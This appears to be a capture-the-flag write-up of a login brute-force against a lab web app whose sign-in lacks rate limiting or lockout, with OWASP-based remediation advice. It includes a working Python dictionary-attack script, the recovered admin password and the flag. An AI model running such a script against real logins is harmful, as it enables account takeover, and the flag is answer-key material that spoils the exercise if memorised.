# Login Brute Force — No Rate Limiting or Account Lockout

## Summary

This breach exploits a login form that applies no rate limiting, account lockout, or CAPTCHA mechanism. The `/index.php?page=signin` endpoint accepts an unlimited number of password attempts for any username. A simple Python script iterating through a common password wordlist recovers the `admin` account password in seconds, granting full access.

---

## Category

**Broken Authentication — Missing Brute Force Protection**
OWASP: [A07:2021 – Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)

---

## Steps to Reproduce

### 1. Identify the login endpoint

The sign-in form submits credentials as GET parameters:

```
http://10.11.8.1:80/index.php?page=signin&username=admin&password=...&Login=Login
```

Using GET for authentication is itself a misconfiguration — credentials appear in server logs, browser history, and proxy logs — but it also makes scripted attacks straightforward.

### 2. Confirm no rate limiting exists

Sending several rapid requests with wrong passwords returns the same error page each time with no delay, lockout, or token challenge. The endpoint is open to unlimited attempts.

### 3. Run the brute force script

```python
import requests

TARGET   = "http://10.11.8.1:80/index.php"
USER     = "admin"
WORDLIST = "/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt"

def try_login(username, password):
    r = requests.get(TARGET, params={
        "page":     "signin",
        "username": username,
        "password": password,
        "Login":    "Login"
    }, timeout=5)
    return "flag" in r.text.lower(), r.text

with open(WORDLIST) as f:
    for i, line in enumerate(f):
        pwd = line.strip()
        if not pwd:
            continue
        found, body = try_login(USER, pwd)
        if found:
            print(f"\n[+] Password found: {pwd}")
            print(body[:500])
            break
        if i % 100 == 0:
            print(f"Tried {i} passwords, last: {pwd}", end="\r")
```

The script iterates through a standard wordlist and detects success by checking whether the string `"flag"` appears in the response body — a string that only appears on the authenticated success page.

### 4. Flag

Once the correct password is found, the server returns the flag embedded in the response page:

```
Username : admin
Password : shadow
Flag     : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
```

---

## Why This Works

A brute force attack is only feasible when the target offers no friction against repeated attempts. This application has none:

- **No rate limiting** — requests are processed at full speed regardless of how many have failed
- **No account lockout** — the `admin` account never becomes temporarily or permanently locked
- **No CAPTCHA** — there is no human verification challenge after failed attempts
- **Credentials sent in GET** — parameters appear in logs and make automation trivial
- **Common password in use** — the correct password (`shadow`) appears in standard wordlists, meaning a dictionary attack succeeds without any need for exhaustive brute force

---

## Root Cause

| Problem | Detail |
|---|---|
| No rate limiting | Unlimited requests per second accepted without throttling |
| No account lockout policy | Repeated failures do not lock or delay the account |
| No CAPTCHA or challenge | Automated scripts are indistinguishable from human users |
| Credentials transmitted via GET | Passwords logged in server access logs, browser history, and proxies |
| Weak, common password | Password found in the top 10,000 most common passwords list |

---

## Remediation

### 1. Implement rate limiting on the login endpoint

Throttle requests per IP address after a threshold of failures:

```python
# Flask-Limiter example
from flask_limiter import Limiter

limiter = Limiter(app, key_func=get_remote_address)

@app.route("/login", methods=["POST"])
@limiter.limit("10 per minute")
def login():
    ...
```

### 2. Implement account lockout

Lock the account (or introduce an exponential delay) after a configurable number of consecutive failures:

```python
MAX_ATTEMPTS = 5
LOCKOUT_MINUTES = 15

if failed_attempts >= MAX_ATTEMPTS:
    if time_since_last_failure < timedelta(minutes=LOCKOUT_MINUTES):
        abort(429, "Account temporarily locked. Try again later.")
```

Prefer a **temporary lockout with increasing delay** over a permanent lockout — permanent lockout enables a denial-of-service attack where an attacker intentionally locks out legitimate users.

### 3. Add CAPTCHA after repeated failures

After 3–5 failed attempts, require a CAPTCHA challenge (e.g. hCaptcha, Cloudflare Turnstile) before the next attempt is processed. This makes automated scripts ineffective without affecting normal users.

### 4. Use POST for login forms, not GET

Credentials must never appear in URLs. Use `method="POST"` on the login form:

```html
<form method="POST" action="/login">
    <input type="text"     name="username">
    <input type="password" name="password">
    <button type="submit">Login</button>
</form>
```

POST bodies are not logged in server access logs or stored in browser history.

### 5. Enforce a strong password policy and credential checks

Reject passwords that appear in known breach lists. The [HaveIBeenPwned Passwords API](https://haveibeenpwned.com/API/v3#PwnedPasswords) provides a k-anonymity-safe lookup so you can check without transmitting the full password hash:

```python
import hashlib, requests

def is_pwned(password: str) -> bool:
    sha1 = hashlib.sha1(password.encode()).hexdigest().upper()
    prefix, suffix = sha1[:5], sha1[5:]
    resp = requests.get(f"https://api.pwnedpasswords.com/range/{prefix}")
    return suffix in resp.text
```

### 6. Monitor and alert on anomalous login activity

Log failed login attempts with timestamps and IP addresses. Alert when a single IP exceeds a threshold of failures, or when a single username sees failures from many IPs (credential stuffing pattern).

---

## References

- [OWASP: Testing for Weak Lock Out Mechanism](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism)
- [OWASP: Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html)
- [CWE-598: Use of GET Request Method with Sensitive Query Strings](https://cwe.mitre.org/data/definitions/598.html)
- [HaveIBeenPwned Passwords API](https://haveibeenpwned.com/API/v3#PwnedPasswords)
